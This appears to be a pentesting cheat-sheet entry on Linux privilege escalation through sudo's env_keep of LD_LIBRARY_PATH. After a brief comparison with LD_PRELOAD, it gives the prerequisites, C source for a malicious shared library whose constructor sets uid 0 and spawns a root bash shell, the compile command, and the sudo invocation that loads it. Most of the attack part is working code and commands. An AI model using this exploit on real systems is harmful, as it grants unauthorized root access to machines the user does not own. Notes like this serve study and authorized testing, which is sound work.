## What is LD_LIBRARY_PATH?
LD_LIBRARY_PATH directs the dynamic link loader (ld.so) where to search for the dynamic shared libraries an application was linked against.

### LD_LIBRARY_PATH vs LD_PRELOAD
>LD_PRELOAD forces specific libraries to load before everything else to override functions.

>LD_LIBRARY_PATH controls where the linker searches for libraries, but it does not force load a specific library.

## How to ?
Pre-requisites:

- [x] NOPASSWD `sudo -l`  
- [x] env_keep += LD_LIBRARY_PATH `sudo -l`  
- [x] Binary loads `.so` libraries (`ldd`)  

Malicious `.so`
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
Compile FILE
```
cd /tmp
gcc -shared -fPIC -o /tmp/libcrypt.so.1 /home/user/tools/sudo/library_path.c
```
Execute the compiled file
```
sudo LD_LIBRARY_PATH=/tmp <BINARY>
```
